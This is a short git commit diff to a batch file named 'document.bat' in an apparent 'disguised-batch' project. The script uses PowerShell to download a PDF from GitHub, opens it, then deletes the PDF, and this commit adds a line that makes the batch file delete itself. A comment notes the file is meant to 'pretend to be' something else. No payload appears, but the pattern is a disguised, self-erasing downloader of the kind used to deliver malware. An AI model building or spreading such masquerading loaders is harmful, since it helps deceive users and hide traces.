ad7176303822cf6cc6f28ec97290bbc7b50f0df6
HaydenPhillips777 <hlphillips1@ualr.edu>
2025-02-11 11:36:51 -0600

    Added line to delete itself

--- document.bat
+++ document.bat
@@ -1,5 +1,7 @@
 @echo off
+REM change the link below to whatever this file is supposed to pretend to be
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/wishtag/disguised-batch/refs/heads/main/document.pdf -OutFile document.pdf"
 document.pdf
-timeout /t 1 /nobreak
+timeout /t 2 /nobreak
 del document.pdf
+del document.bat
